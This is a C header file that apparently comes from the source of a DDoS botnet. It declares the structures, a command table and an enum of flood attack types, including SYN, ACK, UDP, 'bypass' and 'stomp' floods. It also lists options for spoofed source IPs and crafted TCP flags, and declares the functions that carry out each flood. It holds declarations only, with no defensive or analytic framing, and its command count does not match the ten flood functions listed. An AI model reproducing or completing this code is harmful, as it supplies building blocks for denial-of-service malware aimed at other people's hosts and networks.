#pragma once

#include "includes.h"

typedef void * (* COMMAND_FUNC) ();

struct option
{
    uint8_t id;
    uint16_t val_len;
    char *val;
};

struct target
{
    uint32_t host;
    uint8_t netmask;
};

struct resolve
{
	char *domain;
	uint32_t host;
};

struct command
{
	uint8_t id;
	COMMAND_FUNC func;
};

//
struct arguments
{
	struct target *targets;
	struct option *options;
	uint8_t num_of_flags;
	uint8_t num_of_targets;
	uint16_t time;
};

enum
{
	FLOOD_UDPFLOOD = 1,
	FLOOD_ACKPLAIN= 2,
	FLOOD_SYNPLAIN = 3,
  FLOOD_UDPPLAIN = 4,
  FLOOD_SYNACK = 5,
  FLOOD_SYNFLOOD = 6,
  FLOOD_ACKFLOOD = 7,
  FLOOD_ACKPSH = 8,
  FLOOD_BYPASS = 9,
FLOOD_TCPSOCKET = 99,
	COMMAND_COUNT = 6,
	OPT_PORT = 1,
	OPT_SIZE = 2,
//	OPT_THREAD_COUNT = 3,
	OPT_HTTP_PATH = 4,
	OPT_HTTP_CONNECTION = 5,
	OPT_DOMAIN = 6,
	OPT_TCP_TTL = 7,
	OPT_TCP_SOURCE_PORT = 8,
	OPT_TCP_ACK = 9,
	OPT_TCP_FIN = 10,
	OPT_TCP_URG = 11,
	OPT_TCP_PSH = 12,
	OPT_TCP_RST = 13,
	OPT_TCP_SYN = 14,
	OPT_TCP_TOS = 15,
	OPT_TCP_ID = 16,
	OPT_TCP_SEQUENCE = 17,
	OPT_TCP_SOURCE_IP = 18,
	OPT_TCP_ACK_SEQUENCE = 19
};

struct command command_list[COMMAND_COUNT];

void command_parse(char *, int);
void init_commands(void);
void flood_tcp_syn(struct arguments *);
void flood_tcp_ack(struct arguments *);
void flood_tcp_sack(struct arguments *);
void flood_tcp_gack(struct arguments *);
void flood_tcp_gsyn(struct arguments *);
void flood_tcp_stomp(struct arguments *);
void flood_udp_classic(struct arguments *);
void flood_udp_plain(struct arguments *);
void flood_udp_bypass(struct arguments *);
void flood_tcp_socket(struct arguments *);
uint32_t retrieve_opt_ipv4(struct option *, uint8_t, uint8_t, uint32_t);
uint16_t retrieve_opt_num(struct option *, uint8_t, uint8_t, uint16_t);
char *retrieve_opt_str(struct option *, uint8_t, uint8_t, char *);
